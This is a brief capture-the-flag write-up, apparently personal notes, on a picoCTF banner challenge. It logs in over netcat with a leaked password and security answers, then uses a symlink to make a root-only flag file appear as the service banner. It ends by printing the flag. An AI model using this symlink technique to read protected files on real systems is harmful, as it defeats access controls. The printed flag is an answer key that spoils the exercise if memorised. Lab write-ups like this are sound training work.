---
created: 2024-08-08T01:21
updated: 2024-08-08T01:24
---

```bash
# First we get the password from the leak
nc tethys.picoctf.net 57925 # My_Passw@rd_@1234
nc tethys.picoctf.net 62276
> My_Passw@rd_@1234
> DEFCON
> John Draper
```

And we have our shell.

However we don't have permissions to read `/root/flag.txt`.
Had to use the hint.

Anyways, we can solve it with symlinks.

```bash
ln -s -T /root/flag.txt banner
```

Disconnect and connect again, and you will get the flag.

```flag
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_68ca8b23}
```
